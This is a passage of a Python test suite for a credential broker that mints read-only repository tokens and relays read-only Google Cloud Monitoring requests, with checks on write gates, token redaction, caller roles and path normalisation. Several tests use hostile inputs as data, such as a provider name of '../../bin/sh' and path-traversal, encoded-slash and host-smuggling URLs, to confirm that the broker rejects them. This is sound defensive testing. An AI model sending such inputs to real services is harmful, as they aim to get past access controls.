                    credential_proxy.repository_role("acme/tf-live")

    def test_the_write_gate_and_the_refresh_route_never_see_the_context_list(self):
        """The property the issue asked to keep: a context repository stays unwritable.

        `repository_is_managed` is the only question every write path asks,
        and it reads `managed_repos` alone. A repository registered only under
        `context_repos` is therefore refused by `commit`, `push`, the API
        routes and `/v1/forge/refresh` exactly as an unregistered one is --
        with a token for it now existing in the minter, which is why this is
        worth a test rather than an assumption.
        """
        import content_workspace

        with self._lists(managed=["acme/gitops"], context=["acme/tf-live"]):
            self.assertFalse(credential_proxy.repository_is_managed("acme/tf-live"))
            self.assertEqual("context", credential_proxy.repository_role("acme/tf-live"))

            # commit / push: the workspace gate reads the repository off the handle.
            store = mock.Mock()
            store.get.return_value = mock.Mock(repo="acme/tf-live")
            with self.assertRaises(content_workspace.RepositoryNotManaged):
                credential_proxy.require_managed_workspace(store, "h")

            # The API routes and the refresh route share one gate.
            handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
            handler.replies = []
            handler._json = lambda status, payload: handler.replies.append((status, payload))
            with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
                self.assertFalse(handler._repository_is_permitted("acme/tf-live"))
            status, payload = handler.replies[0]
            self.assertEqual(HTTPStatus.FORBIDDEN, status)
            self.assertEqual("REPOSITORY_NOT_MANAGED", payload["code"])

            # The write token's refresh is refused before the helper runs.
            executor = credential_proxy.CommandExecutor.__new__(credential_proxy.CommandExecutor)
            executor.execute_internal = lambda argv: self.fail("helper was run")
            with self.assertRaises(PermissionError):
                executor.refresh_forge_credential("github", "acme/tf-live")

            # Paired: the managed repository passes every one of them.
            self.assertTrue(credential_proxy.repository_is_managed("acme/gitops"))
            store.get.return_value = mock.Mock(repo="acme/gitops")
            credential_proxy.require_managed_workspace(store, "h")
            self.assertTrue(handler._repository_is_permitted("acme/gitops"))


class ReadCredentialMintTest(unittest.TestCase):
    """The read-only mint: admitted by role, spelled with the helper's flag, token never logged."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)
        helpers = Path(self.temp_dir.name)
        (helpers / "github_token_refresh.py").write_text("#!/usr/bin/env python3\n")
        patcher = mock.patch.object(credential_proxy, "FORGE_REFRESH_HELPER_DIR", str(helpers))
        patcher.start()
        self.addCleanup(patcher.stop)

    @staticmethod
    def _result(exit_code, stdout="", stderr=""):
        return credential_proxy.ExecutionResult(
            exit_code=exit_code,
            stdout=stdout,
            stderr=stderr,
            duration_ms=5,
            truncated=False,
            timed_out=False,
        )

    def _executor(self, result=None):
        executor = credential_proxy.CommandExecutor.__new__(credential_proxy.CommandExecutor)
        executor.calls = []
        # The mint runs under the store's fixed workspace term
        # (`_outside_budget`), which records the exemption per thread.
        executor._request_budget = threading.local()

        def run(argv):
            executor.calls.append(list(argv))
            return result

        executor.execute_internal = run
        return executor

    def test_only_a_context_repository_is_minted_for(self):
        # A managed repository has the write credential and must keep riding
        # it; an unregistered one gets no credential of either kind. Neither
        # reaches the helper.
        for role in ("managed", "unregistered"):
            with self.subTest(role=role):
                executor = self._executor()
                with mock.patch.object(credential_proxy, "repository_role", return_value=role):
                    with self.assertRaises(PermissionError):
                        executor.mint_read_credential("github", "acme/gitops")
                self.assertEqual([], executor.calls)

        # Paired: a context repository runs the helper in read-only mode and
        # the token comes back from stdout, whitespace and all.
        token = "ghs_" + "A" * 36
        executor = self._executor(self._result(0, stdout=token + "\n"))
        with mock.patch.object(credential_proxy, "repository_role", return_value="context"):
            self.assertEqual(token, executor.mint_read_credential("github", "acme/tf-live"))
        (argv,) = executor.calls
        self.assertTrue(argv[0].endswith("/github_token_refresh.py"), argv)
        self.assertEqual(["--read-only", "acme/tf-live"], argv[1:])

    def test_the_flag_is_the_one_the_helper_parses(self):
        # Two copies of one string, kept in step here because the broker
        # cannot import the helper for it without importing its CLI side.
        import github_token_refresh

        self.assertEqual(github_token_refresh.READ_ONLY_FLAG, credential_proxy.FORGE_READ_ONLY_FLAG)

    def test_a_failed_mint_logs_the_detail_redacted_and_raises_without_it(self):
        token = "ghs_" + "B" * 36
        executor = self._executor(
            self._result(1, stderr=f"Minty returned error (HTTP 403): echoed {token}\n")
        )
        with mock.patch.object(credential_proxy, "repository_role", return_value="context"):
            with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
                with self.assertRaises(RuntimeError) as raised:
                    executor.mint_read_credential("github", "acme/tf-live")
        self.assertEqual("read-only credential mint failed", str(raised.exception))
        self.assertIn("HTTP 403", logs.output[0])
        self.assertNotIn(token, logs.output[0])
        self.assertIn("[REDACTED]", logs.output[0])

    def test_an_empty_token_is_a_failure_not_a_credential(self):
        executor = self._executor(self._result(0, stdout="  \n"))
        with mock.patch.object(credential_proxy, "repository_role", return_value="context"):
            with self.assertRaises(RuntimeError):
                executor.mint_read_credential("github", "acme/tf-live")

    def test_a_provider_name_cannot_reach_out_of_the_helper_directory(self):
        executor = self._executor()
        with mock.patch.object(credential_proxy, "repository_role", return_value="context"):
            for provider in ("../../bin/sh", "git hub", "", "GitHub"):
                with self.subTest(provider=provider):
                    with self.assertRaises(ValueError):
                        executor.mint_read_credential(provider, "acme/tf-live")
        self.assertEqual([], executor.calls)

    def test_an_absent_helper_is_a_refusal(self):
        executor = self._executor()
        with mock.patch.object(credential_proxy, "repository_role", return_value="context"), \
                mock.patch.object(credential_proxy, "_provider_forge"):
            with self.assertRaises(RuntimeError):
                executor.mint_read_credential("gitlab", "acme/tf-live")
        self.assertEqual([], executor.calls)


class ReadCredentialSelectionTest(unittest.TestCase):
    """What the store is handed per role, and how it reaches git."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)

    def test_a_name_that_resolves_to_no_forge_is_not_logged_as_unreadable_lists(self):
        # Review finding: a resolution refusal was logged as "the repository
        # lists could not be read", sending an operator to the ConfigMap.
        registry = mock.Mock()
        registry.resolve.side_effect = providers.ForgeUnsupported("names no host")
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            credential = credential_proxy.read_credential_for(registry, "acme/infra")
        self.assertIsInstance(credential, providers.NoCredential)
        joined = "\n".join(logs.output)
        self.assertIn("does not resolve to a forge", joined)
        self.assertNotIn("could not be read", joined)

    def test_only_a_context_repository_gets_a_credential(self):
        registry = providers.Registry({"mint": lambda provider, repo: "token"})
        with mock.patch.object(credential_proxy, "repository_role", return_value="context"):
            with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
                credential = credential_proxy.read_credential_for(registry, "acme/tf-live")
        self.assertIsInstance(credential, providers.MintedReadCredential)
        self.assertIn("repo=acme/tf-live role=context", logs.output[0])
        for role in ("managed", "unregistered"):
            with self.subTest(role=role):
                with mock.patch.object(credential_proxy, "repository_role", return_value=role):
                    with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
                        credential = credential_proxy.read_credential_for(registry, "acme/x")
                self.assertIsInstance(credential, providers.NoCredential)
                self.assertIn(f"role={role}", logs.output[0])

    def test_an_unreadable_list_means_no_credential_not_a_refusal(self):
        # `open` has no gate by design; a ConfigMap read that failed must not
        # take `inspect-repository` away from every public repository.
        registry = providers.Registry({"mint": lambda provider, repo: "token"})
        with mock.patch.object(
            credential_proxy, "repository_role", side_effect=RuntimeError("kubectl exited 1")
        ):
            with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
                credential = credential_proxy.read_credential_for(registry, "acme/tf-live")
        self.assertIsInstance(credential, providers.NoCredential)
        self.assertIn("role=unknown", logs.output[0])

    def _executor(self):
        with mock.patch.dict(os.environ, {"CREDENTIAL_PROXY_CONTENT_WORKSPACE": "1"}):
            return CommandExecutor(
                timeout_seconds=10,
                max_output_bytes=1 << 16,
                state_dir=str(Path(self.temp_dir.name) / "state"),
            )

    def test_the_store_the_broker_builds_mints_through_the_executor(self):
        executor = self._executor()
        store = credential_proxy.build_workspace_store(executor)
        minted = []

        def mint(provider, repository):
            minted.append((provider, repository))
            return "s3cret"

        executor.mint_read_credential = mint
        # Bound at construction: the registry was built with the executor's
        # method, so swapping the attribute afterwards must not matter for the
        # property under test -- rebuild to pick the stub up.
        store = credential_proxy.build_workspace_store(executor)
        with mock.patch.object(credential_proxy, "repository_role", return_value="context"):
            credential = store._credential_for("acme/tf-live")
        credential.ensure("acme/tf-live")
        self.assertEqual([("github", "acme/tf-live")], minted)
        config = dict(credential.git_config("acme/tf-live"))
        header = config["http.https://github.com/.extraheader"]
        self.assertEqual(
            "x-access-token:s3cret",
            base64.b64decode(header.split()[-1]).decode("utf-8"),
        )
        self.assertEqual("", config["credential.helper"])

    def test_the_workspace_git_path_carries_the_credential_layer_ahead_of_the_pins(self):
        executor = self._executor()
        stub_dir = Path(self.temp_dir.name) / "fake-bin"
        stub_dir.mkdir(parents=True, exist_ok=True)
        stub = stub_dir / "git"
        stub.write_text("#!/bin/bash\nenv\n", encoding="utf-8")
        stub.chmod(0o755)
        executor.executables["git"] = str(stub)
        tree = executor.content_workspace_root / "repo"
        tree.mkdir(parents=True, exist_ok=True)

        def environment(config=()):
            result = executor.execute_workspace_git(
                ["git", "rev-parse", "HEAD"], tree, config=config
            )
            self.assertEqual(0, result.exit_code, result.stderr)
            self.assertFalse(result.truncated)
            return dict(
                line.split("=", 1) for line in result.stdout.splitlines() if "=" in line
            )

        def layer(env):
            count = int(env["GIT_CONFIG_COUNT"])
            return [(env[f"GIT_CONFIG_KEY_{i}"], env[f"GIT_CONFIG_VALUE_{i}"]) for i in range(count)]

        credential = (
            ("http.https://github.com/.extraheader", "AUTHORIZATION: basic eDp5"),
            ("credential.helper", ""),
        )
        with_credential = layer(environment(credential))
        self.assertEqual(list(credential), with_credential[:2])
        self.assertEqual("core.hooksPath", with_credential[2][0])
        self.assertEqual(
            list(credential_proxy.GIT_FORCED_CONFIG), with_credential[3:],
            "the forced pins must follow the credential so they still win",
        )
        # The token is in the environment of that one process and nowhere in
        # its argv.
        self.assertNotIn("eDp5", " ".join(environment(credential).get("_", "")))

        # Paired: with nothing to add, the layer is exactly what it always was.
        without = layer(environment())
        self.assertEqual("core.hooksPath", without[0][0])
        self.assertEqual(list(credential_proxy.GIT_FORCED_CONFIG), without[1:])
        self.assertNotIn("http.https://github.com/.extraheader", dict(without))

class ApiRelayOverTheSocketTest(unittest.TestCase):
    """The read-only Cloud API relay, driven over a real socket.

    A fake upstream stands in for monitoring.googleapis.com and records what
    reached it, so every property the design's security review claims is
    checked at the edge: which headers leave the broker, which query keys do
    not, which callers are turned away, and what the audit trail says about
    each. `GoogleApiRelay.fetch` runs for real; only the connection is pointed
    at the fake and the token is fixed.
    """

    CALLER = "system:serviceaccount:kubeagents-system:kubeagents-platform-agent-shell"
    ALLOWED = "/v1/gcp/monitoring.googleapis.com/v3/projects/kagents-dev/timeSeries"

    def setUp(self):
        owner = self
        self.upstream_requests = []
        self.reply = {"status": 200, "content_type": "application/json; charset=UTF-8",
                      "body": b'{"timeSeries":[]}', "headers": {}, "delay": 0.0,
                      # (pieces, seconds between them): send the body a piece at
                      # a time, flushing each, for the deadline tests.
                      "trickle": None,
                      # Announce the full Content-Length, send this many bytes,
                      # then close the connection.
                      "truncate_to": None,
                      # Write this exact byte string as the whole response and
                      # close, for responses BaseHTTPRequestHandler cannot frame.
                      "raw": None}

        class UpstreamHandler(BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def do_GET(self):  # noqa: N802
                owner.upstream_requests.append((self.path, dict(self.headers)))
                reply = owner.reply
                time.sleep(reply["delay"])
                try:
                    if reply["raw"] is not None:
                        self.wfile.write(reply["raw"])
                        self.wfile.flush()
                        self.close_connection = True
                        return
                    self.send_response(reply["status"])
                    if reply["content_type"]:
                        self.send_header("Content-Type", reply["content_type"])
                    for name, value in reply["headers"].items():
                        self.send_header(name, value)
                    self.send_header("Content-Length", str(len(reply["body"])))
                    self.end_headers()
                    if reply["truncate_to"] is not None:
                        self.wfile.write(reply["body"][: reply["truncate_to"]])
                        self.wfile.flush()
                        self.close_connection = True
                    elif reply["trickle"] is None:
                        self.wfile.write(reply["body"])
                    else:
                        pieces, gap = reply["trickle"]
                        for piece in pieces:
                            self.wfile.write(piece)
                            self.wfile.flush()
                            time.sleep(gap)
                except OSError:
                    # The broker gave up on us (the deadline test); nothing to report.
                    pass

            def log_message(self, _message, *_args):
                return

        self.upstream = ThreadingHTTPServer(("127.0.0.1", 0), UpstreamHandler)
        threading.Thread(target=self.upstream.serve_forever, daemon=True).start()
        self.addCleanup(self.upstream.server_close)
        self.addCleanup(self.upstream.shutdown)

        class FakeRelay(credential_proxy.GoogleApiRelay):
            """The real fetch over a plain connection to the fake upstream."""

            def __init__(self, port):
                super().__init__()
                self.port = port
                self.hosts = []

            def authorization_header(self):
                return "Bearer broker-token"

            def connection(self, host):
                self.hosts.append(host)
                return http.client.HTTPConnection(
                    "127.0.0.1", self.port, timeout=credential_proxy.API_RELAY_CONNECT_TIMEOUT_S
                )

        self.relay = FakeRelay(self.upstream.server_address[1])

        for attribute in ("api_relay", "authenticator", "policy", "executor",
                          "max_request_bytes", "enforce_read_only"):
            self.addCleanup(
                self._restore,
                attribute,
                attribute in CredentialProxyHandler.__dict__,
                CredentialProxyHandler.__dict__.get(attribute),
            )
        CredentialProxyHandler.api_relay = self.relay
        CredentialProxyHandler.policy = Policy(rules=[], blocked_message="blocked")
        # Above _BODY_LARGER_THAN_SOCKET_BUFFERS, so the refused-POST drain test
        # exercises a body the drain actually reads rather than declines.
        CredentialProxyHandler.max_request_bytes = 16 << 20
        CredentialProxyHandler.enforce_read_only = True

        authenticator = credential_proxy.ServiceAccountAuthenticator(
            audience_roles={
                "kubeagents-credential-proxy": credential_proxy.CALLER_ROLE_SHELL,
                "kubeagents-credential-proxy-chat": credential_proxy.CALLER_ROLE_CHAT,
            },
            allowed_callers=frozenset({self.CALLER}),
            api_host="10.0.0.1",
            api_port="443",
            ca_file="",
            token_file="/nonexistent",
            cache_seconds=0.0,
        )
        roles = {
            "shell-token": credential_proxy.CALLER_ROLE_SHELL,
            "chat-token": credential_proxy.CALLER_ROLE_CHAT,
        }
        caller = self.CALLER

        def fake_review(token):
            if token not in roles:
                raise credential_proxy.AuthenticationError("not our token")
            return credential_proxy.Principal(workload=caller, uid="sa-uid", role=roles[token])

        authenticator._review = fake_review
        CredentialProxyHandler.authenticator = authenticator

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), CredentialProxyHandler)
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.addCleanup(self.server.server_close)
        self.addCleanup(self.server.shutdown)

    @staticmethod
    def _restore(attribute, was_set, original):
        if was_set:
            setattr(CredentialProxyHandler, attribute, original)
        elif attribute in CredentialProxyHandler.__dict__:
            delattr(CredentialProxyHandler, attribute)

    def _request(self, path, token="shell-token", method="GET", headers=None, body=None):
        # http.client rather than urllib: the request target goes on the wire
        # exactly as written, which is what the normal-form tests need.
        sent = dict(headers or {})
        if token is not None:
            sent["Authorization"] = f"Bearer {token}"
        connection = http.client.HTTPConnection(
            "127.0.0.1", self.server.server_address[1], timeout=10
        )
        try:
            connection.request(method, path, body=body, headers=sent)
            response = connection.getresponse()
            return response.status, dict(response.getheaders()), response.read()
        finally:
            connection.close()

    def _raw(self, target: bytes, token=b"shell-token"):
        """Send a request line as bytes; for targets http.client itself refuses to send."""
        with socket.create_connection(("127.0.0.1", self.server.server_address[1]), timeout=10) as sock:
            sock.sendall(
                b"GET " + target + b" HTTP/1.1\r\nHost: broker\r\n"
                b"Authorization: Bearer " + token + b"\r\n\r\n"
            )
            response = http.client.HTTPResponse(sock)
            response.begin()
            return response.status, dict(response.getheaders()), response.read()

    def _json_request(self, *args, **kwargs):
        status, headers, body = self._request(*args, **kwargs)
        return status, headers, json.loads(body)

    # -- the happy path --------------------------------------------------

    def test_a_permitted_read_reaches_the_upstream_with_exactly_two_headers(self):
        query = (
            "filter=metric.type%3D%22kubernetes.io%2Fcontainer%2Fcpu%2Fcore_usage_time%22"
            "&interval.startTime=2026-09-08T00%3A00%3A00Z&key=AIzaFAKE&access_token=x"
            "&oauth_token=y&bearer_token=z&pageSize=1000"
        )
        with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            status, headers, body = self._request(
                f"{self.ALLOWED}?{query}",
                headers={"X-Goog-User-Project": "someone-else", "Accept": "text/plain",
                         "Cookie": "session=1"},
            )
        self.assertEqual(200, status)
        self.assertEqual(b'{"timeSeries":[]}', body)
        self.assertEqual("application/json; charset=UTF-8", headers["Content-Type"])

        self.assertEqual(["monitoring.googleapis.com"], self.relay.hosts)
        self.assertEqual(1, len(self.upstream_requests))
        path, upstream_headers = self.upstream_requests[0]
        # The three credential keys are gone; every other pair is byte-for-byte.
        self.assertEqual(
            "/v3/projects/kagents-dev/timeSeries"
            "?filter=metric.type%3D%22kubernetes.io%2Fcontainer%2Fcpu%2Fcore_usage_time%22"
            "&interval.startTime=2026-09-08T00%3A00%3A00Z&pageSize=1000",
            path,
        )
        self.assertEqual(
            {"Host", "Authorization", "Accept"},
            set(upstream_headers),
            "the upstream request carries the broker's two headers and Host, nothing else",
        )
        self.assertEqual("Bearer broker-token", upstream_headers["Authorization"])
        self.assertEqual("application/json", upstream_headers["Accept"])

        lines = [record.getMessage() for record in logs.records]
        opened = [line for line in lines if line.startswith("api request_id=")]
        self.assertEqual(1, len(opened))
        self.assertIn(f"principal={self.CALLER}", opened[0])
        self.assertIn(" host=monitoring.googleapis.com path=v3/projects/kagents-dev/timeSeries", opened[0])
        forwarded = [line for line in lines if line.startswith("api forwarded request_id=")]
        self.assertEqual(1, len(forwarded))
        self.assertIn(" host=monitoring.googleapis.com status=200 bytes=17 duration_ms=", forwarded[0])
        request_id = opened[0].split()[1]
        self.assertIn(request_id, forwarded[0], "the two lines share one request id")

    def test_the_upstream_status_and_body_come_back_unchanged(self):
        for status, content_type, body in (
            (403, "application/json; charset=UTF-8", b'{"error":{"code":403,"status":"PERMISSION_DENIED"}}'),
            (429, "application/json", b'{"error":{"code":429}}'),
            (404, "text/html", b"<html>gone</html>"),
        ):
            with self.subTest(status=status):
                self.reply.update(status=status, content_type=content_type, body=body)
                with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
                    got_status, headers, got_body = self._request(self.ALLOWED)
                self.assertEqual(status, got_status)
                self.assertEqual(content_type, headers["Content-Type"])
                self.assertEqual(body, got_body)
                self.assertTrue(
                    any(f"api forwarded request_id=" in r.getMessage() and f"status={status}" in r.getMessage()
                        for r in logs.records)
                )

    def test_a_close_delimited_upstream_response_is_relayed_in_full(self):
        # getresponse() sets connection.sock to None when the upstream says
        # Connection: close; the body is still readable through the response's
        # own handle. Re-arming the deadline on connection.sock raised
        # AttributeError on the first read, which no clause caught: a
        # traceback, no response, and a request line with no verdict.
        body = b'{"timeSeries":[' + b"x" * 200_000 + b"]}"
        self.reply.update(body=body, headers={"Connection": "close"})
        with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            status, headers, got = self._request(self.ALLOWED)
        self.assertEqual(200, status)
        self.assertEqual(body, got)
        self.assertEqual("application/json; charset=UTF-8", headers["Content-Type"])
        lines = [r.getMessage() for r in logs.records if r.getMessage().startswith("api ")]
        self.assertEqual(2, len(lines), lines)
        self.assertTrue(lines[1].startswith("api forwarded request_id="), lines[1])
        self.assertIn(f" status=200 bytes={len(body)} ", lines[1])

    def test_an_http10_upstream_without_content_length_is_read_to_eof(self):
        body = b'{"metricDescriptors":[' + b"y" * 70_000 + b"]}"
        self.reply.update(raw=b"HTTP/1.0 200 OK\r\nContent-Type: application/json\r\n\r\n" + body)
        with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            status, headers, got = self._request(self.ALLOWED)
        self.assertEqual(200, status)
        self.assertEqual(body, got)
        self.assertEqual("application/json", headers["Content-Type"])
        lines = [r.getMessage() for r in logs.records if r.getMessage().startswith("api ")]
        self.assertEqual(2, len(lines), lines)
        self.assertTrue(lines[1].startswith("api forwarded request_id="), lines[1])

    def test_a_front_end_414_with_connection_close_passes_through(self):
        self.reply.update(status=414, content_type="text/html; charset=UTF-8",
                          body=b"<html>414 Request-URI Too Large</html>",
                          headers={"Connection": "close"})
        with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            status, headers, got = self._request(self.ALLOWED)
        self.assertEqual(414, status)
        self.assertEqual(b"<html>414 Request-URI Too Large</html>", got)
        self.assertEqual("text/html; charset=UTF-8", headers["Content-Type"])
        self.assertTrue(any("api forwarded request_id=" in r.getMessage() and "status=414" in r.getMessage()
                            for r in logs.records))

    def test_a_query_over_the_length_cap_never_leaves_the_broker(self):
        cap = credential_proxy.API_RELAY_MAX_QUERY_BYTES
        over = "filter=" + "a" * (cap - len("filter=") + 1)
        with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            status, _, payload = self._json_request(f"{self.ALLOWED}?{over}")
        self.assertEqual(400, status)
        self.assertEqual("API_RELAY_BAD_QUERY", payload["code"])
        self.assertIn(str(cap), payload["error"])
        self.assertEqual([], self.upstream_requests)
        self.assertTrue(any("api rejected request_id=" in r.getMessage() and "code=API_RELAY_BAD_QUERY" in r.getMessage()
                            for r in logs.records))
        # Exactly at the cap is forwarded.
        at_cap = "filter=" + "a" * (cap - len("filter="))
        with self.assertLogs(credential_proxy.LOGGER, level="INFO"):
            status, _, _ = self._request(f"{self.ALLOWED}?{at_cap}")
        self.assertEqual(200, status)
        self.assertEqual(1, len(self.upstream_requests))
        self.assertEqual(f"/v3/projects/kagents-dev/timeSeries?{at_cap}", self.upstream_requests[0][0])

    def test_an_upstream_response_with_no_content_type_still_passes(self):
        self.reply.update(content_type="", body=b"raw")
        status, headers, body = self._request(self.ALLOWED)
        self.assertEqual(200, status)
        self.assertEqual(b"raw", body)
        self.assertNotIn("Content-Type", headers)

    # -- who may call ----------------------------------------------------

    def test_the_route_demands_the_shell_role(self):
        # Through the constant as well as the literal path: required_roles()
        # answers () on a miss and the role check then admits everyone, so
        # the table entry has to be spelled from the same constant the
        # dispatch uses.
        for path in (self.ALLOWED, credential_proxy.API_RELAY_PREFIX + "x"):
            with self.subTest(path=path):
                self.assertEqual(
                    (credential_proxy.CALLER_ROLE_SHELL,),
                    credential_proxy.required_roles(path),
                )
        self.assertEqual("/v1/gcp/", credential_proxy.API_RELAY_PREFIX)

    def test_the_chat_gateway_is_refused_before_anything_is_read(self):
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            status, _, payload = self._json_request(self.ALLOWED, token="chat-token")
        self.assertEqual(403, status)
        self.assertEqual("CALLER_ROLE_FORBIDDEN", payload["code"])
        self.assertEqual([], self.upstream_requests)
        self.assertFalse(any("api request_id=" in r.getMessage() for r in logs.records),
                         "a caller the role table turns away never opens an api line")

    def test_an_unauthenticated_caller_is_401(self):
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
            status, _, payload = self._json_request(self.ALLOWED, token=None)
        self.assertEqual(401, status)
        self.assertEqual([], self.upstream_requests)
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
            status, _, _ = self._json_request(self.ALLOWED, token="forged")
        self.assertEqual(401, status)
        self.assertEqual([], self.upstream_requests)

    # -- normal form -----------------------------------------------------

    def test_a_path_not_in_normal_form_is_400_and_names_the_reason(self):
        PATH, HOST, QUERY = "API_RELAY_BAD_PATH", "API_RELAY_BAD_HOST", "API_RELAY_BAD_QUERY"
        cases = (
            ("/v1/gcp/monitoring.googleapis.com/v3/projects/kagents-dev/../other/timeSeries", PATH, "`..`"),
            ("/v1/gcp/monitoring.googleapis.com/v3//projects/kagents-dev/timeSeries", PATH, "empty"),
            ("/v1/gcp/monitoring.googleapis.com/v3/./projects/kagents-dev/timeSeries", PATH, "`.`"),
            ("/v1/gcp/monitoring.googleapis.com/v3%2Fprojects/kagents-dev/timeSeries", PATH, "percent-encoded slash"),
            ("/v1/gcp/monitoring.googleapis.com/v3/projects/kagents-dev/timeSeries%2f", PATH, "percent-encoded slash"),
            ("/v1/gcp/https://monitoring.googleapis.com/v3/projects/kagents-dev/timeSeries", HOST, "scheme"),
            ("/v1/gcp/monitoring.googleapis.com:443/v3/projects/kagents-dev/timeSeries", HOST, "port"),
            ("/v1/gcp/user@monitoring.googleapis.com/v3/projects/kagents-dev/timeSeries", HOST, "user info"),
            ("/v1/gcp/Monitoring.googleapis.com/v3/projects/kagents-dev/timeSeries", HOST, "lower-case"),
            ("/v1/gcp/monitoring%2egoogleapis.com/v3/projects/kagents-dev/timeSeries", HOST, "encoding"),
            ("/v1/gcp//v3/projects/kagents-dev/timeSeries", HOST, "no upstream host"),
            ("/v1/gcp/", HOST, "no upstream host"),
            ("/v1/gcp/monitoring.googleapis.com", PATH, "no API path"),
            ("/v1/gcp/monitoring.googleapis.com/", PATH, "no API path"),
            ("/v1/gcp/monitoring.googleapis.com/v3/projects/kagents-dev/timeSeries?filter=%zz", QUERY, "percent-escapes"),
            ("/v1/gcp/monitoring.googleapis.com/v3/projects/kagents-dev/timeSeries?filter=a%2", QUERY, "percent-escapes"),
            ("/v1/gcp/monitoring.googleapis.com/v3/projects/kagents-dev/timeSeries?a={b}", QUERY, "query characters"),
            ("/v1/gcp/monitoring.googleapis.com/v3/projects/kagents-dev/timeSeries?a=\\b", QUERY, "query characters"),
            ("/v1/gcp/monitoring.googleapis.com/v3/projects/kagents-dev/timeSeries?a=b|c", QUERY, "query characters"),
            ("/v1/gcp/monitoring.googleapis.com/v3/projects/kagents-dev/timeSeries?a=%22b%22&c=\"d\"", QUERY, "query characters"),
            ("/v1/gcp/monitoring.googleapis.com/v3/projects/kagents-dev/timeSeries?a=<b>", QUERY, "query characters"),
            ("/v1/gcp/monitoring.googleapis.com/v3/projects/kagents-dev/timeSeries?a=b^c", QUERY, "query characters"),
        )
        for path, code, reason in cases:
            with self.subTest(path=path):
                with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
                    status, _, payload = self._json_request(path)
                self.assertEqual(400, status)
                self.assertEqual(code, payload["code"])
                self.assertIn(reason, payload["error"])
                self.assertEqual([], self.upstream_requests)
                lines = [r.getMessage() for r in logs.records]
                self.assertTrue(any(line.startswith("api request_id=") for line in lines))
                rejected = [line for line in lines if line.startswith("api rejected request_id=")]
                self.assertEqual(1, len(rejected))
                self.assertIn(f" code={code} reason=", rejected[0])

    def test_brackets_in_the_query_are_forwarded_byte_for_byte(self):
        # `[` and `]` are RFC 3986 gen-delims, but http.client sends them raw
        # and Google accepts them; the Managed Prometheus routes need them
        # (`match[]=`, and `[5m]` in every range vector), and `requests` and
        # `curl -g` leave them unquoted. An earlier shape refused them, which
        # refused the routes.
        prometheus = "/v1/gcp/monitoring.googleapis.com/v1/projects/kagents-dev/location/global/prometheus/api/v1"
        for path, upstream_target in (
            (f"{prometheus}/series?match[]=up&match[]=node_cpu_seconds_total",
             "/v1/projects/kagents-dev/location/global/prometheus/api/v1/series?match[]=up&match[]=node_cpu_seconds_total"),
            (f"{prometheus}/query?query=rate(container_cpu_usage_seconds_total[5m])",
             "/v1/projects/kagents-dev/location/global/prometheus/api/v1/query?query=rate(container_cpu_usage_seconds_total[5m])"),
            (f"{prometheus}/query?query=up[5m]",
             "/v1/projects/kagents-dev/location/global/prometheus/api/v1/query?query=up[5m]"),
            (f"{self.ALLOWED}?a=[b]", "/v3/projects/kagents-dev/timeSeries?a=[b]"),
        ):
            with self.subTest(path=path):
                self.upstream_requests.clear()
                with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
                    status, _, _ = self._request(path)
                self.assertEqual(200, status)
                self.assertEqual([upstream_target], [p for p, _ in self.upstream_requests])
                self.assertTrue(any(r.getMessage().startswith("api forwarded request_id=") for r in logs.records))

    def test_a_query_byte_http_client_cannot_send_is_400_not_a_dropped_connection(self):
        # http.client's own client side refuses these targets, so they go on
        # the wire raw. Before the query check, a raw UTF-8 byte reached
        # putrequest as UnicodeEncodeError -- a ValueError neither except
        # clause caught -- and the caller read zero bytes while the log held a
        # request line with no verdict; a DEL reached it as InvalidURL and was
        # misreported as an unreachable upstream.
        allowed = self.ALLOWED.encode()
        for suffix in (b"?filter=caf\xc3\xa9", b"?filter=\xff", b"?filter=a\x7fb", b"?filter=a\x01b"):
            with self.subTest(suffix=suffix):
                with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
                    status, headers, body = self._raw(allowed + suffix)
                self.assertEqual(400, status)
                payload = json.loads(body)
                self.assertEqual("API_RELAY_BAD_QUERY", payload["code"])
                self.assertEqual([], self.upstream_requests)
                self.assertEqual([], self.relay.hosts)
                lines = [r.getMessage() for r in logs.records]
                self.assertTrue(any(line.startswith("api rejected request_id=") and "code=API_RELAY_BAD_QUERY" in line
                                    for line in lines))

    def test_a_value_error_from_the_upstream_request_line_is_still_a_400(self):
        # The second line of defence: if a target ever reaches fetch that
        # http.client will not send, the answer is the same 400, not a
        # traceback on the server and a reset on the client.
        def raising_fetch(host, target, authorization):
            raise UnicodeEncodeError("ascii", "\xe9", 0, 1, "ordinal not in range(128)")

        self.relay.fetch = raising_fetch
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            status, _, payload = self._json_request(self.ALLOWED)
        self.assertEqual(400, status)
        self.assertEqual("API_RELAY_BAD_QUERY", payload["code"])
        self.assertTrue(any("api rejected request_id=" in r.getMessage() and "reason=UnicodeEncodeError" in r.getMessage()
                            for r in logs.records))

        def raising_invalid_url(host, target, authorization):
            raise http.client.InvalidURL("URL can't contain control characters")

        self.relay.fetch = raising_invalid_url
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING"):
            status, _, payload = self._json_request(self.ALLOWED)
        self.assertEqual(400, status)
